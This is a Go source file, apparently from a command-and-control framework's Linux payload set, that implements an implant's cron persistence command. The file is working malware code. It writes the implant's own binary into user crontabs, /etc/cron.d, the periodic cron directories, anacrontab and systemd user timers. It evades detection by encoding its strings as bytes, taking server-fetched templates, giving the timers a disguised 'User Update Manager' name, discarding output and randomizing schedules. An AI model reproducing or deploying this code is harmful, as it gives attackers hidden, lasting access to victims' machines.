// server/docker/payloads/Linux/action_cron_persistence_linux.go

//go:build linux
// +build linux

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/unix"
)

// CronTemplate holds server-provided template data (v2: array-based)
type CronTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`   // Type identifier
	Templates []string `json:"tpl"` // Array indexed by position
	Params    []string `json:"p"`   // Parameters indexed by position
}

// Template indices (integers don't appear as strings in binary)
// Must match server-side constants in templates/persistence.go
// Note: idxProcSelfExe (28) is declared in action_persistence_linux.go
const (
	// Cron indices (50-99)
	idxCronShebang       = 50
	idxCronComment       = 51
	idxCronDevNull       = 52
	idxCronMaintHeader   = 53
	idxCronShellBash     = 54
	idxCronPathEnv       = 55
	idxCronEtcCronD      = 56
	idxCronEtcAnacrontab = 57
	idxCronEtcHourly     = 58
	idxCronEtcDaily      = 59
	idxCronEtcWeekly     = 60
	idxCronEtcMonthly    = 61
	idxCronSpoolCrontabs = 62
	idxCronSpoolCron     = 63
	idxCronSpoolTabs     = 64
	idxCronFileCheck     = 65
	idxCronFileUpdate    = 66
	idxCronFileMaint     = 67
	idxCronIntHourly     = 68
	idxCronIntDaily      = 69
	idxCronIntWeekly     = 70
	idxCronIntMonthly    = 71
	idxCronIntReboot     = 72
	idxTimerUserDir      = 73
	idxTimerHeader       = 74
	idxTimerOnCalendar   = 75
	idxTimerOnBootSec    = 76
	idxTimerOnUnitSec    = 77
	idxTimerPersistent   = 78
	idxTimerExt          = 79
	idxTimerDefaultName  = 80
)

// Cron persistence strings - short codes transformed by server
var (
	// Actions (short, transformed if needed)
	cronActionAdd    = string([]byte{0x61, 0x64, 0x64})                   // add
	cronActionRemove = string([]byte{0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65}) // remove
	cronActionList   = string([]byte{0x6c, 0x69, 0x73, 0x74})             // list

	// Short flags (transformed from user-friendly flags on server side)
	cronFlagMethod   = string([]byte{0x2d, 0x6d}) // -m
	cronFlagUser     = string([]byte{0x2d, 0x39}) // -9
	cronFlagInterval = string([]byte{0x2d, 0x69}) // -i
	cronFlagCommand  = string([]byte{0x2d, 0x36}) // -6

	// Methods (short codes transformed by server)
	cronMethodSpool    = string([]byte{0x73, 0x70})       // sp (from spool)
	cronMethodCrond    = string([]byte{0x63, 0x64})       // cd (from crond)
	cronMethodPeriodic = string([]byte{0x70, 0x72})       // pr (from periodic)
	cronMethodAnacron  = string([]byte{0x61, 0x6e})       // an (from anacron)
	cronMethodTimer    = string([]byte{0x74, 0x6d})       // tm (from timer)
	cronMethodAll      = string([]byte{0x61, 0x6c, 0x6c}) // all
)

// CronPersistenceCommand handles cron-based persistence
type CronPersistenceCommand struct {
	tpl *CronTemplate
}

// getTpl safely gets template value by index
func (c *CronPersistenceCommand) getTpl(idx int) string {
	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
		val := c.tpl.Templates[idx]
		if val != "" {
			return val
		}
	}
	// Minimal fallbacks for essential values only
	switch idx {
	case idxCronIntHourly:
		return "@hourly"
	case idxProcSelfExe:
		return "/proc/self/exe"
	}
	return ""
}

func (c *CronPersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from Command.Data if provided
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
			var tpl CronTemplate
			if err := json.Unmarshal(decoded, &tpl); err == nil {
				c.tpl = &tpl
			}
		}
	}

	// Default to add if no args or first arg is a flag
	if len(args) == 0 {
		return c.addCronPersistence(args)
	}

	action := args[0]

	// If first arg starts with '-', it's a flag not an action - default to add
	if strings.HasPrefix(action, "-") {
		return c.addCronPersistence(args)
	}

	switch action {
	case cronActionAdd:
		return c.addCronPersistence(args[1:])
	case cronActionRemove:
		return c.removeCronPersistence(args[1:])
	case cronActionList:
		return c.listCronPersistence()
	default:
		// Unknown action - treat as flags for add
		return c.addCronPersistence(args)
	}
}

// addCronPersistence adds cron job via selected method(s)
func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult {
	var targetUser string
	var interval string
	var command string
	var method string = cronMethodAll // Default to all methods

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case cronFlagMethod:
			if i+1 < len(args) {
				method = args[i+1]
				i++
			}
		case cronFlagUser:
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		case cronFlagInterval:
			if i+1 < len(args) {
				interval = args[i+1]
				i++
			}
		case cronFlagCommand:
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		}
	}

	// Defaults
	if targetUser == "" {
		currentUser, err := user.Current()
		if err != nil {
			return CommandResult{
				Output:   Err(E19),
				ExitCode: 1,
			}
		}
		targetUser = currentUser.Username
	}

	if interval == "" {
		interval = c.getTpl(idxCronIntHourly)
	}

	if command == "" {
		procSelfExe := c.getTpl(idxProcSelfExe)
		execPath, err := os.Readlink(procSelfExe)
		if err != nil {
			execPath = os.Args[0]
		}
		command = execPath
	}

	var results []string

	// Execute based on selected method
	switch method {
	case cronMethodSpool:
		if result := c.addViaSpoolCron(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
	case cronMethodCrond:
		if result := c.addViaCronD(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
	case cronMethodPeriodic:
		if result := c.addViaCronDirectories(command, interval); result != "" {
			results = append(results, result)
		}
	case cronMethodAnacron:
		if result := c.addViaAnacron(command); result != "" {
			results = append(results, result)
		}
	case cronMethodTimer:
		if result := c.addViaSystemdTimer(interval, command); result != "" {
			results = append(results, result)
		}
	case cronMethodAll:
		// Try all methods (timer first since it doesn't need root)
		if result := c.addViaSystemdTimer(interval, command); result != "" {
			results = append(results, result)
		}
		if result := c.addViaSpoolCron(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
		if result := c.addViaCronD(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
		if result := c.addViaCronDirectories(command, interval); result != "" {
			results = append(results, result)
		}
		if result := c.addViaAnacron(command); result != "" {
			results = append(results, result)
		}
	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}

	if len(results) == 0 {
		return CommandResult{
			Output:   ErrCtx(E11, method),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// addViaSpoolCron adds to user's crontab file directly
func (c *CronPersistenceCommand) addViaSpoolCron(username, interval, command string) string {
	spoolCrontabs := c.getTpl(idxCronSpoolCrontabs)
	spoolCron := c.getTpl(idxCronSpoolCron)
	spoolTabs := c.getTpl(idxCronSpoolTabs)

	if spoolCrontabs == "" || spoolCron == "" || spoolTabs == "" {
		return ""
	}

	cronPaths := []string{
		fmt.Sprintf(spoolCrontabs, username),
		fmt.Sprintf(spoolCron, username),
		fmt.Sprintf(spoolTabs, username),
	}

	for _, cronPath := range cronPaths {
		parentDir := filepath.Dir(cronPath)
		if _, err := os.Stat(parentDir); os.IsNotExist(err) {
			continue
		}

		if unix.Access(parentDir, unix.W_OK) != nil {
			continue
		}

		cronEntry := c.generateCronEntry(interval, command)

		var existingContent []byte
		if content, err := os.ReadFile(cronPath); err == nil {
			existingContent = content
			if strings.Contains(string(content), command) {
				return ErrCtx(E5, cronPath)
			}
		}

		newContent := append(existingContent, []byte("\n"+cronEntry+"\n")...)

		if err := os.WriteFile(cronPath, newContent, 0600); err == nil {
			return SuccCtx(S1, cronPath)
		}
	}

	return ""
}

// addViaCronD adds job to /etc/cron.d/
func (c *CronPersistenceCommand) addViaCronD(username, interval, command string) string {
	cronDDir := c.getTpl(idxCronEtcCronD)
	if cronDDir == "" {
		return ""
	}

	if unix.Access(cronDDir, unix.W_OK) != nil {
		return ""
	}

	fileCheck := c.getTpl(idxCronFileCheck)
	if fileCheck == "" {
		return ""
	}
	filename := filepath.Join(cronDDir, fileCheck)

	maintHeader := c.getTpl(idxCronMaintHeader)
	shellBash := c.getTpl(idxCronShellBash)
	pathEnv := c.getTpl(idxCronPathEnv)

	cronContent := fmt.Sprintf("%s\n%s\n%s\n\n%s %s %s\n",
		maintHeader, shellBash, pathEnv,
		c.convertInterval(interval), username, command)

	if err := os.WriteFile(filename, []byte(cronContent), 0644); err == nil {
		return SuccCtx(S1, filename)
	}

	return ""
}

// addViaCronDirectories adds to /etc/cron.{hourly,daily,weekly,monthly}
func (c *CronPersistenceCommand) addViaCronDirectories(command, interval string) string {
	intHourly := c.getTpl(idxCronIntHourly)
	intDaily := c.getTpl(idxCronIntDaily)
	intWeekly := c.getTpl(idxCronIntWeekly)
	intMonthly := c.getTpl(idxCronIntMonthly)

	etcHourly := c.getTpl(idxCronEtcHourly)
	etcDaily := c.getTpl(idxCronEtcDaily)
	etcWeekly := c.getTpl(idxCronEtcWeekly)
	etcMonthly := c.getTpl(idxCronEtcMonthly)

	dirMap := map[string]string{
		intHourly:  etcHourly,
		intDaily:   etcDaily,
		intWeekly:  etcWeekly,
		intMonthly: etcMonthly,
	}

	var targetDir string
	for key, dir := range dirMap {
		if key != "" && strings.Contains(interval, key) {
			targetDir = dir
			break
		}
	}

	if targetDir == "" {
		targetDir = etcHourly
	}

	if targetDir == "" || unix.Access(targetDir, unix.W_OK) != nil {
		return ""
	}

	fileUpdate := c.getTpl(idxCronFileUpdate)
	if fileUpdate == "" {
		return ""
	}
	scriptName := filepath.Join(targetDir, fileUpdate)

	shebang := c.getTpl(idxCronShebang)
	scriptContent := fmt.Sprintf("%s\n%s\n", shebang, command)

	if err := os.WriteFile(scriptName, []byte(scriptContent), 0755); err == nil {
		return SuccCtx(S1, scriptName)
	}

	return ""
}

// addViaAnacron adds anacron job for systems that don't run 24/7
func (c *CronPersistenceCommand) addViaAnacron(command string) string {
	anacronTab := c.getTpl(idxCronEtcAnacrontab)
	if anacronTab == "" {
		return ""
	}

	if unix.Access(anacronTab, unix.W_OK) != nil {
		return ""
	}

	content, err := os.ReadFile(anacronTab)
	if err != nil {
		return ""
	}

	if strings.Contains(string(content), command) {
		return Err(E5)
	}

	fileMaint := c.getTpl(idxCronFileMaint)
	anacronEntry := fmt.Sprintf("\n1\t5\t%s\t%s\n", fileMaint, command)
	newContent := append(content, []byte(anacronEntry)...)

	if err := os.WriteFile(anacronTab, newContent, 0644); err == nil {
		return SuccCtx(S1, anacronTab)
	}

	return ""
}

// addViaSystemdTimer creates a systemd user timer (no root required)
func (c *CronPersistenceCommand) addViaSystemdTimer(interval, command string) string {
	currentUser, err := user.Current()
	if err != nil {
		return ""
	}

	timerUserDir := c.getTpl(idxTimerUserDir)
	if timerUserDir == "" {
		return ""
	}

	userDir := filepath.Join(currentUser.HomeDir, timerUserDir)

	if err := os.MkdirAll(userDir, 0755); err != nil {
		return ""
	}

	timerName := c.getTpl(idxTimerDefaultName)
	timerExt := c.getTpl(idxTimerExt)
	if timerName == "" || timerExt == "" {
		return ""
	}

	serviceFile := filepath.Join(userDir, timerName+".service")
	timerFile := filepath.Join(userDir, timerName+timerExt)

	if _, err := os.Stat(timerFile); err == nil {
		return ErrCtx(E5, timerFile)
	}

	serviceContent := fmt.Sprintf(`[Unit]
Description=User Update Manager

[Service]
Type=oneshot
ExecStart=%s
StandardOutput=null
StandardError=null
`, command)

	timerContent := c.generateTimerUnit(interval)

	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
		return ""
	}

	if err := os.WriteFile(timerFile, []byte(timerContent), 0644); err != nil {
		os.Remove(serviceFile)
		return ""
	}

	return SuccCtx(S1, timerFile)
}

// generateTimerUnit creates a systemd timer unit file content
func (c *CronPersistenceCommand) generateTimerUnit(interval string) string {
	var timerSpec string

	intHourly := c.getTpl(idxCronIntHourly)
	intDaily := c.getTpl(idxCronIntDaily)
	intWeekly := c.getTpl(idxCronIntWeekly)
	intMonthly := c.getTpl(idxCronIntMonthly)
	intReboot := c.getTpl(idxCronIntReboot)
	onCalendar := c.getTpl(idxTimerOnCalendar)
	onBootSec := c.getTpl(idxTimerOnBootSec)

	switch interval {
	case intHourly, "@hourly":
		timerSpec = onCalendar + "hourly"
	case intDaily, "@daily":
		timerSpec = onCalendar + "daily"
	case intWeekly, "@weekly":
		timerSpec = onCalendar + "weekly"
	case intMonthly, "@monthly":
		timerSpec = onCalendar + "monthly"
	case intReboot, "@reboot":
		timerSpec = onBootSec + "1min"
	default:
		timerSpec = onCalendar + "hourly"
	}

	timerHeader := c.getTpl(idxTimerHeader)
	timerPersistent := c.getTpl(idxTimerPersistent)
	timerName := c.getTpl(idxTimerDefaultName)

	return fmt.Sprintf(`[Unit]
Description=User Update Manager Timer

%s
%s
%s
Unit=%s.service

[Install]
WantedBy=timers.target
`, timerHeader, timerSpec, timerPersistent, timerName)
}

// generateCronEntry creates a cron entry
func (c *CronPersistenceCommand) generateCronEntry(interval, command string) string {
	cronComment := c.getTpl(idxCronComment)
	comment := fmt.Sprintf("%s %s", cronComment, time.Now().Format("2006-01-02"))

	cronTime := c.convertInterval(interval)

	devNull := c.getTpl(idxCronDevNull)
	return fmt.Sprintf("%s\n%s %s %s", comment, cronTime, command, devNull)
}

// convertInterval converts special intervals to cron format
func (c *CronPersistenceCommand) convertInterval(interval string) string {
	intHourly := c.getTpl(idxCronIntHourly)
	intDaily := c.getTpl(idxCronIntDaily)
	intWeekly := c.getTpl(idxCronIntWeekly)
	intMonthly := c.getTpl(idxCronIntMonthly)
	intReboot := c.getTpl(idxCronIntReboot)

	switch interval {
	case intHourly:
		return fmt.Sprintf("%d * * * *", time.Now().Unix()%60)
	case intDaily:
		return fmt.Sprintf("%d %d * * *", time.Now().Unix()%60, time.Now().Unix()%24)
	case intWeekly:
		return fmt.Sprintf("%d %d * * %d", time.Now().Unix()%60, time.Now().Unix()%24, time.Now().Unix()%7)
	case intMonthly:
		return fmt.Sprintf("%d %d %d * *", time.Now().Unix()%60, time.Now().Unix()%24, (time.Now().Unix()%28)+1)
	case intReboot:
		return intReboot
	default:
		return interval
	}
}

// removeCronPersistence removes cron persistence
func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandResult {
	var targetUser string
	var method string = cronMethodAll

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case cronFlagMethod:
			if i+1 < len(args) {
				method = args[i+1]
				i++
			}
		case cronFlagUser:
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		}
	}

	if targetUser == "" {
		currentUser, _ := user.Current()
		if currentUser != nil {
			targetUser = currentUser.Username
		}
	}

	var results []string

	switch method {
	case cronMethodSpool:
		results = append(results, c.removeSpoolCron(targetUser)...)

	case cronMethodCrond:
		if result := c.removeCronD(); result != "" {
			results = append(results, result)
		}

	case cronMethodPeriodic:
		results = append(results, c.removeCronDirectories()...)

	case cronMethodAnacron:
		if err := c.cleanAnacron(); err == nil {
			anacronTab := c.getTpl(idxCronEtcAnacrontab)
			results = append(results, SuccCtx(S2, anacronTab))
		}

	case cronMethodTimer:
		results = append(results, c.removeSystemdTimer()...)

	case cronMethodAll:
		results = append(results, c.removeSpoolCron(targetUser)...)
		if result := c.removeCronD(); result != "" {
			results = append(results, result)
		}
		results = append(results, c.removeCronDirectories()...)
		if err := c.cleanAnacron(); err == nil {
			anacronTab := c.getTpl(idxCronEtcAnacrontab)
			results = append(results, SuccCtx(S2, anacronTab))
		}
		results = append(results, c.removeSystemdTimer()...)

	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}

	if len(results) == 0 {
		return CommandResult{
			Output:   ErrCtx(E4, method),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

func (c *CronPersistenceCommand) removeSpoolCron(targetUser string) []string {
	var results []string
	spoolCrontabs := c.getTpl(idxCronSpoolCrontabs)
	spoolCron := c.getTpl(idxCronSpoolCron)
	spoolTabs := c.getTpl(idxCronSpoolTabs)

	if spoolCrontabs == "" {
		return results
	}

	cronPaths := []string{
		fmt.Sprintf(spoolCrontabs, targetUser),
		fmt.Sprintf(spoolCron, targetUser),
		fmt.Sprintf(spoolTabs, targetUser),
	}
	for _, cronPath := range cronPaths {
		if err := c.cleanCronFile(cronPath); err == nil {
			results = append(results, SuccCtx(S2, cronPath))
		}
	}
	return results
}

func (c *CronPersistenceCommand) removeCronD() string {
	cronDDir := c.getTpl(idxCronEtcCronD)
	fileCheck := c.getTpl(idxCronFileCheck)
	if cronDDir == "" || fileCheck == "" {
		return ""
	}

	cronDFile := filepath.Join(cronDDir, fileCheck)
	if err := os.Remove(cronDFile); err == nil {
		return SuccCtx(S2, cronDFile)
	}
	return ""
}

func (c *CronPersistenceCommand) removeCronDirectories() []string {
	var results []string
	fileUpdate := c.getTpl(idxCronFileUpdate)
	if fileUpdate == "" {
		return results
	}

	dirs := []string{
		c.getTpl(idxCronEtcHourly),
		c.getTpl(idxCronEtcDaily),
		c.getTpl(idxCronEtcWeekly),
		c.getTpl(idxCronEtcMonthly),
	}

	for _, dir := range dirs {
		if dir == "" {
			continue
		}
		scriptPath := filepath.Join(dir, fileUpdate)
		if err := os.Remove(scriptPath); err == nil {
			results = append(results, SuccCtx(S2, scriptPath))
		}
	}
	return results
}

// cleanCronFile removes our entries from a cron file
func (c *CronPersistenceCommand) cleanCronFile(filePath string) error {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(content), "\n")
	var cleanedLines []string
	skipNext := false

	cronComment := c.getTpl(idxCronComment)
	detectPattern := strings.TrimPrefix(cronComment, "# ")

	for _, line := range lines {
		if detectPattern != "" && strings.Contains(line, detectPattern) {
			skipNext = true
			continue
		}
		if skipNext {
			skipNext = false
			continue
		}
		cleanedLines = append(cleanedLines, line)
	}

	return os.WriteFile(filePath, []byte(strings.Join(cleanedLines, "\n")), 0600)
}

// cleanAnacron removes our anacron entries
func (c *CronPersistenceCommand) cleanAnacron() error {
	anacronPath := c.getTpl(idxCronEtcAnacrontab)
	if anacronPath == "" {
		return fmt.Errorf("no anacron path")
	}

	content, err := os.ReadFile(anacronPath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(content), "\n")
	var cleanedLines []string
	fileMaint := c.getTpl(idxCronFileMaint)

	for _, line := range lines {
		if fileMaint == "" || !strings.Contains(line, fileMaint) {
			cleanedLines = append(cleanedLines, line)
		}
	}

	return os.WriteFile(anacronPath, []byte(strings.Join(cleanedLines, "\n")), 0644)
}

// removeSystemdTimer removes systemd user timer files
func (c *CronPersistenceCommand) removeSystemdTimer() []string {
	var results []string

	currentUser, err := user.Current()
	if err != nil {
		return results
	}

	timerUserDir := c.getTpl(idxTimerUserDir)
	timerName := c.getTpl(idxTimerDefaultName)
	timerExt := c.getTpl(idxTimerExt)

	if timerUserDir == "" || timerName == "" {
		return results
	}

	userDir := filepath.Join(currentUser.HomeDir, timerUserDir)

	serviceFile := filepath.Join(userDir, timerName+".service")
	timerFile := filepath.Join(userDir, timerName+timerExt)

	if err := os.Remove(timerFile); err == nil {
		results = append(results, SuccCtx(S2, timerFile))
	}

	if err := os.Remove(serviceFile); err == nil {
		results = append(results, SuccCtx(S2, serviceFile))
	}

	return results
}

// listCronPersistence lists all found cron persistence
func (c *CronPersistenceCommand) listCronPersistence() CommandResult {
	var results []string

	cronComment := c.getTpl(idxCronComment)
	detectPattern := strings.TrimPrefix(cronComment, "# ")

	currentUser, _ := user.Current()
	if currentUser != nil {
		spoolCrontabs := c.getTpl(idxCronSpoolCrontabs)
		spoolCron := c.getTpl(idxCronSpoolCron)

		if spoolCrontabs != "" {
			cronPaths := []string{
				fmt.Sprintf(spoolCrontabs, currentUser.Username),
				fmt.Sprintf(spoolCron, currentUser.Username),
			}

			for _, path := range cronPaths {
				if content, err := os.ReadFile(path); err == nil {
					if detectPattern != "" && strings.Contains(string(content), detectPattern) {
						results = append(results, SuccCtx(S6, path))
					}
				}
			}
		}
	}

	cronDDir := c.getTpl(idxCronEtcCronD)
	fileCheck := c.getTpl(idxCronFileCheck)
	if cronDDir != "" && fileCheck != "" {
		cronDFile := filepath.Join(cronDDir, fileCheck)
		if _, err := os.Stat(cronDFile); err == nil {
			results = append(results, SuccCtx(S6, cronDFile))
		}
	}

	fileUpdate := c.getTpl(idxCronFileUpdate)
	if fileUpdate != "" {
		dirs := []string{
			c.getTpl(idxCronEtcHourly),
			c.getTpl(idxCronEtcDaily),
			c.getTpl(idxCronEtcWeekly),
			c.getTpl(idxCronEtcMonthly),
		}
		for _, dir := range dirs {
			if dir == "" {
				continue
			}
			scriptPath := filepath.Join(dir, fileUpdate)
			if _, err := os.Stat(scriptPath); err == nil {
				results = append(results, SuccCtx(S6, scriptPath))
			}
		}
	}

	anacronPath := c.getTpl(idxCronEtcAnacrontab)
	fileMaint := c.getTpl(idxCronFileMaint)
	if anacronPath != "" && fileMaint != "" {
		if content, err := os.ReadFile(anacronPath); err == nil {
			if strings.Contains(string(content), fileMaint) {
				results = append(results, SuccCtx(S6, anacronPath))
			}
		}
	}

	timerUserDir := c.getTpl(idxTimerUserDir)
	timerName := c.getTpl(idxTimerDefaultName)
	timerExt := c.getTpl(idxTimerExt)
	if currentUser != nil && timerUserDir != "" && timerName != "" {
		userDir := filepath.Join(currentUser.HomeDir, timerUserDir)
		timerFile := filepath.Join(userDir, timerName+timerExt)
		if _, err := os.Stat(timerFile); err == nil {
			results = append(results, SuccCtx(S6, timerFile))
		}
	}

	if len(results) == 0 {
		return CommandResult{
			Output:   Err(E4),
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}
